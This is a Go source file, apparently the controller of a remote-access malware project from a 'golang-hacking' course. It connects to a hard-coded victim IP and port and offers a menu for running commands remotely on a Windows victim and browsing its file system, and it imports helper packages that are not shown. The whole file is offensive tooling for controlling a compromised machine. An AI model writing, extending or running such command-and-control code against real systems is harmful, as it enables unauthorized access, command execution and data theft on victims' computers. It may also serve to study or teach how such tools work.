package main

import (
	"bufio"
	"fmt"
	"golang-hacking/P3_malwareServer/core/ExecuteCommandWindows"
	"golang-hacking/P3_malwareServer/core/Move"
	"golang-hacking/P3_malwareServer/core/handleConnection"
	"log"
	"os"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func options() {
	fmt.Println("[1] ExecuteCommands")
	fmt.Println("[99] Exit")
	fmt.Println()
}

func main() {
	IP := "192.168.10.191"
	Port := "9090"
	connection, err := handleConnection.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl {
		options()
		fmt.Printf("[+] Enter Options ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Command Execution program")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)
		case user_input == "2":
			fmt.Println("[+] Navigating File system on Victim")
			err = Move.NavigateFilesystem(connection)
			DisplayError(err)
		case user_input == "99":
			fmt.Println("[+] Exiting the program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again ")
		}

	}
}
